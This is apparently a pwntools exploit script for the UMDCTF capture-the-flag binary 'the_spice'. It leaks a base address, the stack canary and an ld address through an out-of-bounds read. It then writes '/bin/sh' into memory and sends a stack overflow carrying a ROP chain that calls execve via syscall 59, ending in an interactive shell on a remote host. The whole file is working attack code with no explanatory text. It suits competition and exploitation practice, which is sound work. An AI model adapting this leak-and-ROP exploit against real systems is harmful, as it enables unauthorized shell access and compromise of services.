#!/usr/bin/env python3

from pwn import *

context.binary = e = ELF("./the_spice")
ld = ELF("ld-linux-x86-64.so.2")
target = "remote"
context.terminal = ["tmux", "new-window"]
context.arch = "amd64"

if target == "debug":
    io = gdb.debug(e.path,'''
    break *main+1361
    ''')
    # nc challs.umdctf.io 31721
elif target == "remote":
    io = remote("10.0.0.88", 5000)
else:
    io = process(e.path)

# get base address to struct array
io.sendline('4')
io.recvuntil('saw: ')
base = int(io.recvline(), 16) 
log.info(f"base: {hex(base)}")

# leak canary
io.sendline('3')
io.sendline('9')
io.recvuntil('Buyer 9: ')
name = u32(io.recvuntil(",")[:4])
io.recvuntil("allocated ")
spice = int(io.recvuntil(" "))

canary = hex(name) + hex(spice)[2:]
log.info(canary)

# leak some ld address
index = 13
io.sendline('3')
io.sendline(f'{index}')
io.recvuntil(f'Buyer {index}: ')
name = io.recvuntil(",")[:-1]
io.recvuntil("allocated ")
spice = int(io.recvuntil(" "))
# int(hex(u32(upper.ljust(4, b"\0"))) + hex(lower)[2:].rjust(8, "0"), 16)
addr = int(hex(u32(name.ljust(4, b'\0'))) + hex(spice)[2:].rjust(8, "0"),16)
log.info(f"func: {addr}")


# canary off set 44
ld.address = addr - 237632
rop = ROP(ld)

# add bin_sh
io.sendline("1")
io.sendline("0")
io.sendline("9")
io.sendline("/bin/sh")
bin_sh = base + 4

rop.raw("a" * 44)
rop.raw(int(canary,16))
rop.raw("b" * 8)
rop.raw(rop.rdi.address)
rop.raw(bin_sh)
rop.raw(rop.rax.address)
rop.raw(59)
rop.raw(0)
rop.raw(0)
rop.raw(rop.rsi.address)
rop.raw(0)
rop.raw(rop.syscall.address)
rop.raw("W" * 8)


len = len(rop.chain()) + 2

io.sendline("1")
io.sendline("7")
io.sendline(str(len))
io.sendline(rop.chain())



io.interactive()
